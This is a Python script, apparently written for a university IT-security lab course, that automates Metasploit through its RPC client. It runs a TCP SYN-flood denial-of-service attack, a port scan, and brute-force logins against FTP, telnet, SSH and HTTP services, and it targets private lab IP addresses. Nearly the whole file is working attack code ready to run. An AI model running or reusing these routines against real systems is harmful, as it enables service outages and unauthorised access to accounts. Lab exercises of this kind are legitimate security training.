from pymetasploit3.msfrpc import MsfRpcClient
from packet import send_packet

class Metasploit:
    def __init__(self):
        # Start metasploit rpc server with msfrpcd -P kali
        # The MsfRpcClient class provides the core functionality to navigate through the Metasploit framework.
        self.client = MsfRpcClient('kali', ssl=True)
        for console in self.client.consoles.list:
            self.client.consoles.console(console["id"]).destroy()

        self.cid = self.client.consoles.console().cid

    # Start a denial-of-service (dos) attack
    # It sends a bunch of tcp handshakes (syn packages) to the target
    def dos_attack(self, ip: str, port: int):
        exploit = self.client.modules.use('auxiliary', 'dos/tcp/synflood')
        exploit['RHOSTS'] = ip
        exploit['RPORT'] = port
        exploit['INTERFACE'] = 'wlan0'
        exploit['NUM'] = 500
        print(exploit.description)
        print(f'Attacking {ip} on port {port}')
        print(self.client.consoles.console(self.cid).run_module_with_output(exploit))

    # Checks for open tcp ports, specified in 'PORTS'
    def tcp_portscan_attack(self, ip: str):
        exploit = self.client.modules.use('auxiliary', 'scanner/portscan/tcp')
        exploit['RHOSTS'] = ip
        exploit['PORTS'] = '22-25,80,443, 1883, 6668,8080'

        output = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        print(output)
        # Check if TCP port is open
        ports = []
        lines = output.split('\n')
        for line in lines:
            if line.startswith('[+]'):
                ports.append(int(line.split(':')[2].split(' ')[0]))
        return ports



    # Brute-force login attack on ftp, telnet, ssh and http
    def brute_force_login(self, ip: str, service: str):
        if(service == 'ftp'):
            exploit = self.client.modules.use('auxiliary', 'scanner/ftp/ftp_login')
        elif(service == 'telnet'):
            exploit = self.client.modules.use('auxiliary', 'scanner/telnet/telnet_login')
        elif(service == 'ssh'):
            exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
        elif(service == 'http'):
            exploit = self.client.modules.use('auxiliary', 'scanner/http/http_login')
        exploit['RHOSTS'] = ip
        exploit['USERPASS_FILE'] = '/home/kali/git/it-sicherheit-prakitkum/user_pass.txt'
        print(self.client.consoles.console(self.cid).run_module_with_output(exploit))

if __name__ == "__main__":
    metaspl = Metasploit()
    #send_packet("brute", "192.168.12.251", "start")
    metaspl.tcp_portscan_attack('192.168.12.113')
    #metaspl.brute_force_login('192.168.12.251', 'telnet')
    #metaspl.dos_attack('192.168.12.113')
    #send_packet("dos", "192.168.12.251", "stop")
    #metaspl.brute_force_login('127.0.0.1', 'ssh')
